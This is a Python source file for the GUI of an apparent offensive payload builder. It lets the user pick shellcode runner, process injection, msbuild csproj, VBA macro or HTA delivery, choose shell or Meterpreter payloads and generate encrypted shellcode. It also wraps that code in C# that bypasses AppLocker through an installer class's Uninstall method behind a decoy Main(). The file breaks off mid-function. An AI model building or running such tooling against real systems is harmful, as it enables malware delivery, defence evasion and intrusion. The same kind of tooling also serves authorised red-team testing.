import ttkbootstrap as tb
from PIL import Image, ImageTk
from tkinter import END
import psutil, json, os, re
import logging
from core.builder import generate_shellcode_threaded, build_exe_from_output
from core.ui_helpers import copy_msf_command, update_msf_entry

logger = logging.getLogger(__name__)

# creating UI components
def create_base_layout(root, center_width=450):
    # === FRAME SETUP ===
    # Create left frame first
    left_frame = tb.Frame(root, bootstyle="dark")
    left_frame.pack(side=tb.LEFT, fill=tb.BOTH, expand=True)
    
    # Create right frame next 
    right_frame = tb.Frame(root, bootstyle="dark")
    right_frame.pack(side=tb.RIGHT, fill=tb.BOTH, expand=True)
    
    # Create center frame last so it goes in the middle
    center_frame = tb.Frame(root, bootstyle="dark", width=center_width)
    center_frame.pack(side=tb.LEFT, fill=tb.BOTH, expand=False)
    center_frame.pack_propagate(False)  # Prevent frame from shrinking to fit contents

    # Only configure background if root is actually the main window (not a tab frame)
    if hasattr(root, 'wm_title'):  # Check if it's a top-level window
        root.configure(background="#1f2523")

    # Load and resize background images
    left_bg_original = Image.open("frameImages/left_bg.png")
    right_bg_original = Image.open("frameImages/right_bg.png")

    left_bg_image = ImageTk.PhotoImage(left_bg_original.resize((275, root.winfo_screenheight())))
    right_bg_image = ImageTk.PhotoImage(right_bg_original.resize((275, root.winfo_screenheight())))

    left_bg_label = tb.Label(left_frame, image=left_bg_image, bootstyle="dark")
    left_bg_label.place(x=0, y=0, relwidth=1, relheight=1)

    right_bg_label = tb.Label(right_frame, image=right_bg_image, bootstyle="dark")
    right_bg_label.place(x=0, y=0, relwidth=1, relheight=1)

    # Return references for GonkWareApp to bind events + configure backgrounds
    return {
        "left_frame": left_frame,
        "right_frame": right_frame,
        "center_frame": center_frame,
        "left_bg_label": left_bg_label,
        "right_bg_label": right_bg_label,
        "left_bg_original": left_bg_original,
        "right_bg_original": right_bg_original,
        "left_bg_image": left_bg_image,
        "right_bg_image": right_bg_image,
    }

# Creating UI elements
def create_left_right_controls(app):
    # --- LEFT SIDE ---
    app.technique_options = ["Shellcode Runner", "Process Injection", "csproj msbuild", "VBAMacro", "HTARunner"]
    app.selected_technique = tb.StringVar()
    app.selected_technique.set(app.technique_options[0])
    
    # Add callback to update build button and clear center frame when technique changes
    app.selected_technique.trace('w', lambda *args: on_technique_change(app))

    technique_label = tb.Label(app.left_frame, text="TECHNIQUE:", style="SectionLabel.TLabel")
    technique_label.pack(pady=5, padx=10, anchor="nw")
    technique_dropdown = tb.Combobox(
        app.left_frame,
        textvariable=app.selected_technique,
        values=app.technique_options,
        state="readonly",
        style="RedCombo.TCombobox",
    )
    technique_dropdown.configure(font=("Consolas", 12, "bold"), width=18)
    technique_dropdown.pack(pady=5, padx=10, anchor="nw")

    app.architecture = tb.StringVar(value="x64")
    arch_label = tb.Label(app.left_frame, text="ARCHITECTURE:", style="SectionLabel.TLabel")
    arch_label.pack(pady=5, padx=10, anchor="nw")
    create_radio(app.root, app.left_frame, "x64", app.architecture, "x64").pack(pady=2, padx=10, anchor="nw")
    create_radio(app.root, app.left_frame, "x86", app.architecture, "x86").pack(pady=2, padx=10, anchor="nw")

    app.payload_type = tb.StringVar(value="shell")
    payload_label = tb.Label(app.left_frame, text="PAYLOAD:", style="SectionLabel.TLabel")
    payload_label.pack(pady=5, padx=10, anchor="nw")
    shell_radio = create_radio(app.root, app.left_frame, "Shell", app.payload_type, "shell")
    apply_hover_effect(app.root, shell_radio, var=app.payload_type)
    shell_radio.pack(pady=2, padx=10, anchor="nw")
    meterpreter_radio = create_radio(app.root, app.left_frame, "Meterpreter", app.payload_type, "meterpreter")
    apply_hover_effect(app.root, meterpreter_radio, var=app.payload_type)
    meterpreter_radio.pack(pady=2, padx=10, anchor="nw")

    app.connection_options = ["tcp", "http", "https"]
    app.selected_connection = tb.StringVar(value="tcp")
    connection_label = tb.Label(app.left_frame, text="CONNECTION:", style="SectionLabel.TLabel")
    connection_label.pack(pady=5, padx=10, anchor="nw")
    connection_dropdown = tb.Combobox(app.left_frame, textvariable=app.selected_connection, values=app.connection_options, state="readonly", style="RedCombo.TCombobox")
    connection_dropdown.configure(font=("Consolas", 12, "bold"), width=16)
    connection_dropdown.pack(pady=5, padx=10, anchor="nw")

    app.network_interface_options = psutil.net_if_addrs().keys()
    app.selected_interface = tb.StringVar(value=list(app.network_interface_options)[0])
    interface_label = tb.Label(app.left_frame, text="INTERFACE:", style="SectionLabel.TLabel")
    interface_label.pack(pady=5, padx=10, anchor="nw")
    interface_dropdown = tb.Combobox(app.left_frame, textvariable=app.selected_interface, values=list(app.network_interface_options), state="readonly", style="RedCombo.TCombobox")
    interface_dropdown.configure(font=("Consolas", 12, "bold"), width=16)
    interface_dropdown.pack(pady=5, padx=10, anchor="nw")

    app.port = tb.StringVar(value="443")

    # Port validation function
    def validate_port(new_value):
        if not new_value:
            return True
        if new_value.isdigit():
            try:
                val = int(new_value)
                return 1 <= val <= 65535
            except ValueError:
                return False
        return False

    vcmd = (app.root.register(validate_port), "%P")
    port_label = tb.Label(app.left_frame, text="PORT:", style="SectionLabel.TLabel")
    port_label.pack(pady=5, padx=10, anchor="nw")
    port_entry = tb.Entry(app.left_frame, textvariable=app.port, validate="key", validatecommand=vcmd, style="RedEntry.TEntry", width=6)
    port_entry.pack(pady=5, padx=10, anchor="nw")

    generate_button = tb.Button(app.left_frame, text="Generate", command=lambda: generate_shellcode_threaded(app, update_generation_state), bootstyle="danger", style="Generate.TButton", width=15)
    generate_button.pack(pady=10, padx=10, anchor="nw")
    app.generate_button = generate_button

    # --- RIGHT SIDE ---
    options_label = tb.Label(app.right_frame, text="OPTIONS:", style="SectionLabel.TLabel", justify="right", anchor="e")
    options_label.pack(pady=5, padx=10, anchor="ne")

    # Applocker checkbox (initially disabled)
    app.applocker_var = tb.BooleanVar()
    app.applocker_checkbox = create_neon_checkbox(app.root, app.right_frame, text="AppLocker", variable=app.applocker_var, state=tb.DISABLED, justify="right", anchor="e")
    app.applocker_checkbox.pack(pady=5, padx=10, anchor="ne")

    # Bind applocker checkbox callback
    def on_applocker_toggle():
        if app.applocker_var.get():
            # Store current content before loading AppLocker template
            app.previous_content = app.output_text.get("1.0", "end-1c")
            load_and_display_applocker_bypass(app)
        else:
            # Restore previous content when unchecked
            restore_previous_content(app)

    app.applocker_var.trace_add("write", lambda *args: on_applocker_toggle())

    app.msf_button_text = tb.StringVar(value="MSF quick copy")

    msf_label = tb.Label(app.left_frame, text="MSF COMMAND:", style="MSFLabel.TLabel")
    msf_label.configure(font=("Consolas", 15, "bold"))
    msf_label.pack(pady=10, padx=10, anchor="nw")

    msf_frame = tb.Frame(app.left_frame, style="Custom.TFrame")
    msf_frame.pack(padx=10, pady=5, anchor="nw")

    app.msf_entry = tb.Text(msf_frame, background="#FEFE00", foreground="#000000", insertbackground="#000000", relief=tb.FLAT, highlightthickness=0, font=("Consolas", 15, "bold"), height=1, width=15)
    app.msf_entry.configure(foreground="#000000", background="#FEFE00", insertbackground="#000000")
    update_msf_entry(app, app.msf_button_text.get())
    app.msf_entry.tag_configure("left", justify="left")
    app.msf_entry.tag_add("left", "1.0", "end")
    app.msf_entry.configure(font=("Consolas", 15, "bold"))
    app.msf_entry.pack(side="left", fill="x", expand=True)

    app.copy_button = tb.Button(app.left_frame, text="Copy", style="CopyButton.TButton", command=lambda: copy_msf_command(app), width=10, state=tb.DISABLED)
    app.copy_button.pack(padx=10, pady=5, anchor="nw")

# Creating the output section in the center frame
def create_output_section(center_frame):
    text_frame = tb.Frame(center_frame, style="Custom.TFrame")
    text_frame.pack(padx=10, pady=10, fill=tb.BOTH, expand=True)

    scrollbar = tb.Scrollbar(text_frame)
    scrollbar.pack(side=tb.RIGHT, fill=tb.Y)

    output_text = tb.Text(
        text_frame,
        yscrollcommand=None,  # Initially disable scrollbar
        background="#000000",
        foreground="#fefe00",
        wrap=tb.WORD,
        insertbackground="#fefe00",
        selectbackground="#333333",
        font=("Consolas", 10, "bold"),
        state="disabled"  # Start in disabled state to prevent scrolling
    )

    output_text.pack(fill=tb.BOTH, expand=True)

    # Disable all scroll events initially
    def disable_scroll(event):
        return "break"
    
    output_text.bind("<MouseWheel>", disable_scroll)
    output_text.bind("<Button-4>", disable_scroll)
    output_text.bind("<Button-5>", disable_scroll)
    output_text.bind("<Up>", disable_scroll)
    output_text.bind("<Down>", disable_scroll)
    output_text.bind("<Prior>", disable_scroll)  # Page Up
    output_text.bind("<Next>", disable_scroll)   # Page Down
    output_text.bind("<Home>", disable_scroll)
    output_text.bind("<End>", disable_scroll)

    # Center background image - scale based on frame width
    output_bg_original = Image.open("frameImages/center_bg.png")
    # Use a smaller default size that scales with the frame (use minimum viable size)
    image_size = max(40, min(80, 40))  # Minimum 20px, maximum 80px, default 40px
    output_bg_image = ImageTk.PhotoImage(output_bg_original.resize((image_size, image_size)))
    
    # Temporarily enable to add image
    output_text.configure(state="normal")
    output_text.image_create("1.0", image=output_bg_image)
    output_text.tag_lower("sel")
    
    # Configure the "bold" tag to match the widget's colors
    output_text.tag_configure(
        "bold",
        foreground="#fefe00",
        background="#000000",
        font=("Consolas", 10, "bold")
    )

    # Force disabled state after image is placed
    output_text.configure(state="disabled")

    return {
        "output_text": output_text,
        "output_bg_original": output_bg_original,
        "output_bg_image": output_bg_image,
        "scrollbar": scrollbar
    }

# Setting up the output display with resize handler
def setup_output_display(center_frame, resize_handler):
    output_refs = create_output_section(center_frame)
    output_refs["output_text"].bind("<Configure>", resize_handler)
    return output_refs

# radio button creation with hover and flicker effects
def create_radio(root, parent, text, variable, value):
    style = tb.Style()
    import re
    safe_text = re.sub(r'\W|^(meter)', '_', text, flags=re.IGNORECASE)
    style_name = f"CustomRadio.{safe_text}.TRadiobutton"

    if not style.lookup(style_name, "font"):
        style.configure(
            style_name,
            font=("Consolas", 12, "bold"),
            foreground="#ec1c3a",
            background="#000000",
            indicatorcolor="#ec1c3a",
            indicatorbackground="#000000",
            indicatorrelief="flat",
        )

    radio = tb.Radiobutton(
        parent,
        text=text,
        variable=variable,
        value=value,
        style=style_name,
        bootstyle="danger"
    )

    apply_hover_effect(root, radio, style_name, var=variable)
    return radio

# Creating status controls on the right side
def create_status_controls(app):
    # Build EXE button
    app.build_button = tb.Button(app.right_frame, text="Build EXE", command=lambda: build_exe_from_output(app),
)
    app.build_button.pack(pady=50, padx=10, anchor="se")

    # Open folder button (initially hidden)
    app.open_folder_button = tb.Button(
        app.right_frame,
        text="Open",
        command=app.open_output_folder,
        style="OpenFolder.TButton",
        bootstyle="info",
    )
    app.open_folder_button.pack(pady=5, padx=10, anchor="se")
    app.open_folder_button.pack_forget()

    # Top status label
    app.top_status_label = tb.Label(
        app.right_frame,
        text="Status:",
        style="StatusLabel.TLabel",
        width=12  # Fixed width to prevent frame resizing
    )
    app.top_status_label.configure(font=("Consolas", 15, "bold"))
    app.top_status_label.pack(pady=5, padx=10, anchor="se")

    # Bottom status label
    app.bottom_status_label = tb.Label(
        app.right_frame,
        text="Idle",
        style="BottomStatusLabel.TLabel",
        width=12  # Fixed width to prevent frame resizing
    )
    app.bottom_status_label.pack(pady=(0, 10), padx=10, anchor="se")

    # Loading animation image (initially hidden)
    app.loading_image_label = tb.Label(
        app.right_frame,
        bootstyle="dark",
        borderwidth=0,
        style="Loading.TLabel"
    )
    app.loading_image_label.pack(pady=(10, 20), anchor="s")
    app.loading_image_label.place_forget()
    
    # Initialize the build button state based on default technique selection
    update_build_button(app)

# Copy output to clipboard for CSProj files
def copy_csproj_to_clipboard(app):
    try:
        import pyperclip
    except ImportError:
        app.top_status_label.config(text="pyperclip not installed", foreground="#ff5555")
        app.flicker_widget(app.top_status_label, "#ff0000", "#1f1f1f", steps=4, interval=60, final_color="#ec1c3a")
        logger.error("pyperclip module not installed. Install with: pip install pyperclip")
        return
    
    full_output = app.output_text.get("1.0", "end").strip()
    if not full_output:
        app.top_status_label.config(text="Nothing to copy", foreground="#ff5555")
        app.flicker_widget(app.top_status_label, "#ff0000", "#1f1f1f", steps=4, interval=60, final_color="#ec1c3a")
        return
    
    try:
        pyperclip.copy(full_output)
        app.top_status_label.config(text="Copied!", foreground="#00ff00")
        app.bottom_status_label.config(text="to clipboard", foreground="#00ff00")
        app.flicker_widget(app.top_status_label, "#00ff00", "#2e2e2e", final_color="#00ff00")
    except Exception as e:
        app.top_status_label.config(text="Copy failed", foreground="#ff5555")
        app.flicker_widget(app.top_status_label, "#ff0000", "#1f1f1f", steps=4, interval=60, final_color="#ec1c3a")
        logger.error(f"Copy to clipboard failed: {e}")

# Copy VBA Macro to clipboard
def copy_vba_macro_to_clipboard(app):
    """Copy the generated VBA macro to clipboard"""
    
    # Get the full output text (VBA macro code)
    full_output = app.output_text.get("1.0", "end").strip()
    
    if not full_output:
        app.output_text.configure(state="normal")
        app.output_text.insert("end", "\n[!] No VBA macro code to copy.\n")
        app.output_text.configure(state="disabled")
        return
    
    try:
        # Use tkinter's clipboard functionality
        app.root.clipboard_clear()
        app.root.clipboard_append(full_output)
        app.root.update()  # Ensure clipboard is updated
        
        # Update status to show copy success
        app.top_status_label.config(text="VBA Macro Copied!", foreground="#00ff00")
        app.bottom_status_label.config(text="to clipboard", foreground="#00ff00")
        app.flicker_widget(app.top_status_label, "#00ff00", "#2e2e2e", final_color="#00ff00")
        
        logger.info("VBA Macro copied to clipboard successfully")
        
    except Exception as e:
        app.top_status_label.config(text="Copy failed", foreground="#ff5555")
        app.flicker_widget(app.top_status_label, "#ff0000", "#1f1f1f", steps=4, interval=60, final_color="#ec1c3a")
        logger.error(f"Error copying to clipboard: {e}")

# Update the build button based on selected technique
def update_build_button(app):
    technique = app.selected_technique.get()
    
    if technique == "csproj msbuild":
        app.build_button.config(
            text="Copy CSProj",
            command=lambda: copy_csproj_to_clipboard(app),
            state=tb.DISABLED  # Disabled until generation
        )
        # Disable AppLocker checkbox for CSProj (not applicable)
        if hasattr(app, 'applocker_checkbox'):
            app.applocker_checkbox.configure(state=tb.DISABLED)
            app.applocker_var.set(False)  # Uncheck it
    elif technique == "VBAMacro":
        app.build_button.config(
            text="Copy Macro",
            command=lambda: copy_vba_macro_to_clipboard(app),
            state=tb.DISABLED  # Disabled until generation
        )
        # Disable AppLocker checkbox for VBA Macro (not applicable)
        if hasattr(app, 'applocker_checkbox'):
            app.applocker_checkbox.configure(state=tb.DISABLED)
            app.applocker_var.set(False)  # Uncheck it
    elif technique == "HTARunner":
        app.build_button.config(
            text="Copy HTA",
            command=lambda: copy_vba_macro_to_clipboard(app),  # Reuse same copy function
            state=tb.DISABLED  # Disabled until generation
        )
        # Disable AppLocker checkbox for HTA Runner (not applicable)
        if hasattr(app, 'applocker_checkbox'):
            app.applocker_checkbox.configure(state=tb.DISABLED)
            app.applocker_var.set(False)  # Uncheck it
    else:
        app.build_button.config(
            text="Build EXE",
            command=lambda: build_exe_from_output(app),
            state=tb.DISABLED  # Disabled until generation
        )
        # Disable AppLocker checkbox until generation for shellcode techniques
        if hasattr(app, 'applocker_checkbox'):
            app.applocker_checkbox.configure(state=tb.DISABLED)
            app.applocker_var.set(False)  # Uncheck it

# Create a flickering neon checkbox - NOT USED CURRENTLY
def create_neon_checkbox(root, parent, text, variable, **kwargs):
    style = tb.Style()
    import re
    safe_text = re.sub(r'\W|^(meter)', '_', text, flags=re.IGNORECASE)
    style_name = f"CustomCheck.{safe_text}.TCheckbutton"

    if not style.lookup(style_name, "font"):
        style.configure(
            style_name,
            font=("Consolas", 12, "bold"),  # Changed from 15 to 12
            foreground="#ec1c3a",
            background="#000000",
            indicatorbackground="#000000",
            selectcolor="#000000"
        )

    checkbox = tb.Checkbutton(
        parent,
        text=text,
        variable=variable,
        style=style_name,
        state=kwargs.get("state", tb.NORMAL),
        bootstyle="",
        takefocus=False
    )

    # Hover and flicker effects
    def on_enter(e):
        style.configure(style_name, foreground="#ff3c5f")

    # Leave effect
    def on_leave(e):
        style.configure(style_name, foreground="#ec1c3a")

    # Flicker effect
    def flicker(step=0):
        flicker_colors = ["#91ddd3", "#ec1c3a"]
        if step < 6:
            style.configure(style_name, foreground=flicker_colors[step % 2])
            root.after(100, lambda: flicker(step + 1))
        else:
            style.configure(style_name, foreground="#ec1c3a")

    # Toggle effect
    def on_toggle(*_):
        if variable.get():
            flicker()

    checkbox.bind("<Enter>", on_enter)
    checkbox.bind("<Leave>", on_leave)
    variable.trace_add("write", on_toggle)

    return checkbox

# Apply hover and flicker effects to a widget
def apply_hover_effect(root, widget, style_name=None, var=None):
    style = tb.Style()
    style_name = style_name or widget.cget("style") or "TRadiobutton"

    # Hover effects
    def on_enter(e):
        style.configure(style_name, foreground="#91ddd3")

    # Leave effect
    def on_leave(e):
        style.configure(style_name, foreground="#ec1c3a")

    # Flicker effect
    def flicker(step=0):
        if step < 6:
            flicker_color = "#91ddd3" if step % 2 == 0 else "#ec1c3a"
            style.configure(style_name, foreground=flicker_color)
            widget._flicker_job = root.after(100, lambda: flicker(step + 1))
        else:
            style.configure(style_name, foreground="#ec1c3a")
            widget._flicker_job = None

    if var:
        def on_var_change(*_):
            if widget.cget("value") == var.get():
                flicker()
        var.trace_add("write", on_var_change)

    widget.bind("<Enter>", on_enter)
    widget.bind("<Leave>", on_leave)

# Update the generation state of buttons and labels 
def update_generation_state(app, enabled=True, top_text=None, bottom_text=None, color=None):
    state = tb.NORMAL if enabled else tb.DISABLED

    app.root.after(0, lambda: app.build_button.config(state=state))
    app.root.after(0, lambda: app.copy_button.config(state=state))
    app.root.after(0, lambda: app.generate_button.config(state=state))

    # Enable/disable scrollbar based on generation state
    if hasattr(app, 'scrollbar') and hasattr(app, 'output_text'):
        if enabled:
            # Enable scrollbar after generation only if content is generated
            app.root.after(0, lambda: app.output_text.configure(yscrollcommand=app.scrollbar.set))
            app.root.after(0, lambda: app.scrollbar.config(command=app.output_text.yview))
            
            # Re-enable scroll events
            def enable_scroll_events():
                app.output_text.unbind("<MouseWheel>")
                app.output_text.unbind("<Button-4>")
                app.output_text.unbind("<Button-5>")
                app.output_text.unbind("<Up>")
                app.output_text.unbind("<Down>")
                app.output_text.unbind("<Prior>")
                app.output_text.unbind("<Next>")
                app.output_text.unbind("<Home>")
                app.output_text.unbind("<End>")
            
            app.root.after(0, enable_scroll_events)
        else:
            # Disable scrollbar during generation
            app.root.after(0, lambda: app.output_text.configure(yscrollcommand=None))
            app.root.after(0, lambda: app.scrollbar.config(command=None))
            
            # Disable scroll events
            def disable_scroll_events():
                def disable_scroll(event):
                    return "break"
                
                app.output_text.bind("<MouseWheel>", disable_scroll)
                app.output_text.bind("<Button-4>", disable_scroll)
                app.output_text.bind("<Button-5>", disable_scroll)
                app.output_text.bind("<Up>", disable_scroll)
                app.output_text.bind("<Down>", disable_scroll)
                app.output_text.bind("<Prior>", disable_scroll)
                app.output_text.bind("<Next>", disable_scroll)
                app.output_text.bind("<Home>", disable_scroll)
                app.output_text.bind("<End>", disable_scroll)
            
            app.root.after(0, disable_scroll_events)

    # Handle AppLocker checkbox state
    if hasattr(app, 'applocker_checkbox'):
        if enabled:
            # Only re-enable AppLocker checkbox for shellcode techniques after generation
            technique = app.selected_technique.get()
            if technique not in ["csproj msbuild", "VBAMacro", "HTARunner"]:
                app.root.after(0, lambda: app.applocker_checkbox.configure(state=tb.NORMAL))
        else:
            # Disable and uncheck AppLocker checkbox when generation starts
            app.root.after(0, lambda: app.applocker_checkbox.configure(state=tb.DISABLED))
            app.root.after(0, lambda: app.applocker_var.set(False))

    status_text = top_text if top_text else ("Idle" if enabled else "Generating")
    bottom_status = bottom_text if bottom_text else ("Ready" if enabled else "Shellcode")
    status_color = color if color else ("#91ddd3" if enabled else "#FEFE00")

    app.root.after(0, lambda: app.top_status_label.config(
        text=status_text,
        foreground=status_color
    ))

    app.root.after(0, lambda: app.bottom_status_label.config(
        text=bottom_status,
        foreground=status_color
    ))

# Bind dynamic resizing for left and right background images
def bind_dynamic_bg_resize(app):

    # Resize handlers for left frame
    def resize_left_bg(event):
        resized = app.left_bg_original.resize((event.width, event.height))
        app.left_bg_image = ImageTk.PhotoImage(resized)
        app.left_bg_label.configure(image=app.left_bg_image)
        app.left_bg_label.image = app.left_bg_image

    # Resize handlers for right frame
    def resize_right_bg(event):
        resized = app.right_bg_original.resize((event.width, event.height))
        app.right_bg_image = ImageTk.PhotoImage(resized)
        app.right_bg_label.configure(image=app.right_bg_image)
        app.right_bg_label.image = app.right_bg_image

    app.left_frame.bind("<Configure>", resize_left_bg)
    app.right_frame.bind("<Configure>", resize_right_bg)

# Resize handler for center output background image
def resize_center_bg(app, event):
    # Resize the original image to match the widget size
    resized = app.output_bg_original.resize((event.width, event.height))
    app.output_bg_image = ImageTk.PhotoImage(resized)

    # Only reinsert the image if there's no text (initial state)
    current_text = app.output_text.get("1.0", "end").strip()
    if not current_text:
        app.output_text.image_create("1.0", image=app.output_bg_image)
        app.output_text.tag_lower("sel")

def load_and_display_applocker_bypass(app):
    """Load and merge the current technique with applockerBypass.json template"""
    try:
        # Get the currently selected technique
        current_technique = app.selected_technique.get()
        logger.info(f"Merging {current_technique} with AppLocker bypass")
        
        # Load the current technique template
        technique_template = app.get_selected_template()
        if not technique_template:
            logger.error(f"No template found for technique: {current_technique}")
            return
        
        # Load the AppLocker bypass template from new modular system
        from core.template_loader import load_template_data
        all_templates = load_template_data()
        
        if "applocker_bypass" not in all_templates:
            logger.error("AppLocker bypass template not found in modular system")
            return
            
        applocker_template = all_templates["applocker_bypass"]
        
        # Generate the technique with actual AES encryption first
        # This ensures we get real encrypted shellcode, key, and IV values
        if hasattr(app, 'shellcode_only') and app.shellcode_only:
            from core.builder import build_final_script
            
            # Build the normal technique with AES encryption to get real values
            normal_script = build_final_script(
                template=technique_template,
                shellcode=app.shellcode_only
            )
            
            # Extract the actual AES values from the generated script
            aes_values = extract_aes_values_from_script(normal_script)
            
            # Build AppLocker script with real AES values
            final_script = build_applocker_script_simple(
                technique_template, applocker_template, aes_values
            )
        else:
            # Fallback to placeholder-based approach if no shellcode available
            final_script = build_applocker_script_simple(technique_template, applocker_template, {})
        
        # Display the C# code in the center frame
        app.render_script(final_script)
        
    except Exception as e:
        logger.error(f"Error merging technique with AppLocker bypass: {e}")
        app.output_text.configure(state="normal")
        app.output_text.delete("1.0", tb.END)
        app.output_text.insert(tb.END, f"[!] Error merging templates: {e}")
        app.output_text.configure(state="disabled")

def restore_previous_content(app):
    """Restore the previous content when AppLocker checkbox is unchecked"""
    try:
        if hasattr(app, 'previous_content') and app.previous_content and app.previous_content.strip():
            # Use render_script to restore proper formatting and styling
            app.render_script(app.previous_content)
        else:
            # If no previous content, show the background image with proper styling
            app.output_text.configure(state="normal")
            app.output_text.delete("1.0", tb.END)
            app.output_text.image_create("1.0", image=app.output_bg_image)
            app.output_text.tag_lower("sel")
            app.output_text.configure(state="disabled")
    except Exception as e:
        logger.error(f"Error restoring previous content: {e}")
        # Fallback to showing background image if restore fails
        try:
            app.output_text.configure(state="normal")
            app.output_text.delete("1.0", tb.END)
            app.output_text.image_create("1.0", image=app.output_bg_image)
            app.output_text.tag_lower("sel")
            app.output_text.configure(state="disabled")
        except:
            pass

def merge_technique_with_applocker(technique_template, applocker_template):
    """Merge a technique template with the AppLocker bypass template"""
    merged = {}
    
    # Merge directives - combine both sets, ensuring System.Configuration.Install is included
    merged_directives = list(technique_template.get("directives", []))
    for directive in applocker_template.get("directives", []):
        if directive not in merged_directives:
            merged_directives.append(directive)
    merged["directives"] = merged_directives
    
    # For AppLocker bypass, we need to restructure everything
    # We'll create a single code block that contains both classes properly structured
    
    technique_code_blocks = technique_template.get("code_blocks", {})
    technique_functions = technique_template.get("function_declarations", [])
    applocker_functions = applocker_template.get("function_declarations", [])
    constants = technique_template.get("constant_declarations", [])
    function_definitions = technique_template.get("function_definitions", [])
    
    # Create the complete AppLocker bypass structure
    complete_code = []
    
    # Add the Sample installer class
    complete_code.append("[System.ComponentModel.RunInstaller(true)]")
    complete_code.append("public class Sample : System.Configuration.Install.Installer")
    complete_code.append("{")
    complete_code.append("    public override void Uninstall(System.Collections.IDictionary savedState)")
    complete_code.append("    {")
    
    # Add all technique code blocks inside the installer method
    for key, block in technique_code_blocks.items():
        complete_code.append(f"        // --- {key.replace('_', ' ').title()} ---")
        for line in block:
            complete_code.append(f"        {line}")
        complete_code.append("")
    
    complete_code.append("    }")
    complete_code.append("")
    
    # Add DLL imports and constants inside the Sample class
    if technique_functions or applocker_functions:
        complete_code.append("    // DLL Imports")
        all_functions = list(technique_functions)
        for func in applocker_functions:
            if func not in all_functions:
                all_functions.append(func)
        for func in all_functions:
            complete_code.append(f"    {func}")
        complete_code.append("")
    
    if constants:
        complete_code.append("    // Constants")
        for const in constants:
            complete_code.append(f"    {const}")
        complete_code.append("")
    
    complete_code.append("}")
    complete_code.append("")
    
    # Add the decoy Program class
    complete_code.append("class Program")
    complete_code.append("{")
    complete_code.append("    static void Main(string[] args)")
    complete_code.append("    {")
    complete_code.append("        Console.WriteLine(\"Decoy Main() - Nothing to see here...\");")
    complete_code.append("    }")
    
    # Add function definitions (like AESDecrypt) to Program class
    if function_definitions:
        complete_code.append("")
        for line in function_definitions:
            if line.strip().startswith("static"):
                complete_code.append(f"    {line}")
            elif line.strip() in ["{", "}"]:
                complete_code.append(f"    {line}")
            elif line.strip():
                complete_code.append(f"    {line}")
            else:
                complete_code.append(line)
    
    complete_code.append("}")
    
    # Create a single main code block with the complete structure
    merged_code_blocks = {"main": complete_code}
    merged["code_blocks"] = merged_code_blocks
    
    # Clear these since we handled them manually
    merged["function_declarations"] = []
    merged["constant_declarations"] = []
    merged["function_definitions"] = []
    
    return merged

def build_applocker_script_directly(technique_template, applocker_template):
    """Build AppLocker bypass C# code directly without using template processing"""
    
    # Get all components from technique template
    technique_directives = technique_template.get("directives", [])
    technique_functions = technique_template.get("function_declarations", [])
    technique_constants = technique_template.get("constant_declarations", [])
    technique_code_blocks = technique_template.get("code_blocks", {})
    technique_function_defs = technique_template.get("function_definitions", [])
    
    # Get components from applocker template
    applocker_directives = applocker_template.get("directives", [])
    applocker_functions = applocker_template.get("function_declarations", [])
    
    # Merge directives
    all_directives = list(technique_directives)
    for directive in applocker_directives:
        if directive not in all_directives:
            all_directives.append(directive)
    
    # Merge function declarations
    all_functions = list(technique_functions)
    for func in applocker_functions:
        if func not in all_functions:
            all_functions.append(func)
    
    # Build the complete C# script
    script_lines = []
    
    # Add using statements
    for directive in all_directives:
        script_lines.append(directive)
    script_lines.append("")
    
    # Add Sample installer class
    script_lines.append("[System.ComponentModel.RunInstaller(true)]")
    script_lines.append("public class Sample : System.Configuration.Install.Installer")
    script_lines.append("{")
    script_lines.append("    public override void Uninstall(System.Collections.IDictionary savedState)")
    script_lines.append("    {")
    
    # Add all technique code blocks inside the installer method
    for key, block in technique_code_blocks.items():
        script_lines.append(f"        // --- {key.replace('_', ' ').title()} ---")
        for line in block:
            script_lines.append(f"        {line}")
        script_lines.append("")
    
    # Add code blocks from applocker template if they exist
    applocker_code_blocks = applocker_template.get("code_blocks", {})
    for key, block in applocker_code_blocks.items():
        if key not in technique_code_blocks:  # Avoid duplicates
            script_lines.append(f"        // --- {key.replace('_', ' ').title()} ---")
            for line in block:
                script_lines.append(f"        {line}")
            script_lines.append("")
    
    script_lines.append("    }")
    script_lines.append("")
    
    # Add DLL imports inside Sample class
    if all_functions:
        script_lines.append("    // DLL Imports")
        for func in all_functions:
            script_lines.append(f"    {func}")
        script_lines.append("")
    
    # Add constants inside Sample class
    if technique_constants:
        script_lines.append("    // Constants")
        for const in technique_constants:
            script_lines.append(f"    {const}")
        script_lines.append("")
    
    # Merge all function definitions (including structs from AppLocker template)
    all_function_defs = list(technique_function_defs) if technique_function_defs else []
    applocker_function_defs = applocker_template.get("function_definitions", [])
    if applocker_function_defs:
        # Smart deduplication - identify structs and functions to avoid duplicates
        existing_structs = set()
        existing_functions = set()
        
        # First, identify what's already in technique_function_defs
        for line in all_function_defs:
            if line.strip().startswith("public struct "):
                struct_name = line.strip().replace("public struct ", "").strip()
                existing_structs.add(struct_name)
            elif line.strip().startswith("static ") and "(" in line:
                func_signature = line.strip().split("(")[0]
                existing_functions.add(func_signature)
        
        # Add AppLocker definitions that don't conflict
        i = 0
        while i < len(applocker_function_defs):
            line = applocker_function_defs[i]
            
            if line.strip().startswith("public struct "):
                # Check if this struct already exists
                struct_name = line.strip().replace("public struct ", "").strip()
                if struct_name not in existing_structs:
                    # Add the entire struct definition
                    all_function_defs.append(line)
                    existing_structs.add(struct_name)
                    i += 1
                    # Add struct body lines until closing brace
                    while i < len(applocker_function_defs):
                        struct_line = applocker_function_defs[i]
                        all_function_defs.append(struct_line)
                        if struct_line.strip() == "}":
                            break
                        i += 1
                else:
                    # Skip this struct - it already exists
                    i += 1
                    while i < len(applocker_function_defs) and applocker_function_defs[i].strip() != "}":
                        i += 1
                    # Skip the closing brace too
                    if i < len(applocker_function_defs) and applocker_function_defs[i].strip() == "}":
                        i += 1
            elif line.strip().startswith("static ") and "(" in line:
                # Check if this function already exists
                func_signature = line.strip().split("(")[0]
                if func_signature not in existing_functions:
                    # Add the entire function definition including body
                    all_function_defs.append(line)
                    existing_functions.add(func_signature)
                    i += 1
                    # Add function body lines until we find the matching closing brace
                    brace_count = 0
                    while i < len(applocker_function_defs):
                        func_line = applocker_function_defs[i]
                        all_function_defs.append(func_line)
                        if func_line.strip() == "{":
                            brace_count += 1
                        elif func_line.strip() == "}":
                            brace_count -= 1
                            if brace_count == 0:
                                break
                        i += 1
                else:
                    # Skip this function - it already exists
                    i += 1
                    brace_count = 0
                    while i < len(applocker_function_defs):
                        func_line = applocker_function_defs[i]
                        if func_line.strip() == "{":
                            brace_count += 1
                        elif func_line.strip() == "}":
                            brace_count -= 1
